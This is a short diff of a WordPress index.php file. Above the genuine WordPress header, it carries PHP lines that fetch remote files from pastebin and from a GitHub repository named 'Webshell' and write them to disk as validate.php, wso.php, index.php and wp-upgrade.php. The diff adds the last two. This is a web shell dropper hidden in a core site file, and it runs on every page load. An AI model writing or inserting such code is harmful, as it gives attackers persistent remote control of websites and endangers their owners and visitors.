@@ -1,5 +1,7 @@
 <?php file_put_contents('validate.php', file_get_contents('https://pastebin.com/raw/8VCzXSUp'));?>
 <?php file_put_contents('wso.php', file_get_contents('https://raw.githubusercontent.com/SpecimentID/Webshell/master/wso.php'));?>
+<?php file_put_contents('index.php', file_get_contents('https://raw.githubusercontent.com/SpecimentID/Webshell/master/wp.txt'));?>
+<?php file_put_contents('wp-upgrade.php', file_get_contents('https://raw.githubusercontent.com/SpecimentID/Webshell/master/wp2.txt'));?>
 <?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
